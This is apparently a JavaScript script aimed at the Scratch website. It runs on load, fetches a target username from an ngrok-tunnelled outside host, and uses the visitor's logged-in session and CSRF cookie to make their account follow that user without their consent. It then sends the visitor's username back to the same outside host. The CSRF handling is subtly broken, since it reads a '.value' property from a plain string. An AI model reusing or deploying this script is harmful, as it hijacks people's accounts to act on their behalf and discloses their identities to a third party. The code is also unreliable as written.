function getCookie(cname) {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(';');
  for(let i = 0; i <ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}

async function follow(target_username){
    const coookie = await getCookie("scratchcsrftoken");
    
    const sessionResponse = await fetch("https://scratch.mit.edu/session/?blreferer", {
      headers: {
        "X-Requested-With": "XMLHttpRequest",
        "x-csrftoken": coookie?.value
      }
    });

    const sessionData = await sessionResponse.json();
    const current_username = sessionData.user.username;
    const cookie = await getCookie("scratchcsrftoken");
    await fetch("https://scratch.mit.edu/site-api/users/followers/"+target_username+"/add/", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
        "Accept": "*/*",
        "Accept-Language": "en-GB,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
				"x-csrftoken": ""+cookie?.value
    },
    "referrer": "https://scratch.mit.edu/",
    "body": "usernames="+current_username+"",
    "method": "PUT",
    "mode": "cors"
});


}

async function open_kit() {
  try {
    // Get CSRF token from cookies
    const cookiee = await getCookie("scratchcsrftoken");

    // Fetch the target username from your backend
    const response = await fetch("https://poodle-relevant-alien.ngrok-free.app/", {
      headers: {
        "ngrok-skip-browser-warning": "eee"
      }
    });

    const data = await response.json(); // expecting { username: "..." }
    const target_username = data.username;

    alert(target_username)
    
    // Follow the fetched user
    follow(target_username); // Make sure this function is defined elsewhere

    // Fetch the current Scratch session to get the logged-in username
    const sessionResponse = await fetch("https://scratch.mit.edu/session/?blreferer", {
      headers: {
        "X-Requested-With": "XMLHttpRequest",
        "x-csrftoken": cookiee?.value
      }
    });

    const sessionData = await sessionResponse.json();
    const current_username = sessionData.user.username;

    // POST the current username to your backend
    await fetch("https://poodle-relevant-alien.ngrok-free.app/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "ngrok-skip-browser-warning": "eee"
      },
      body: JSON.stringify({ username: current_username })
    });

  } catch (error) {
    console.error("Error in open_kit:", error);
  }
}

open_kit();

// window.location.href = "https://scratch.mit.edu";
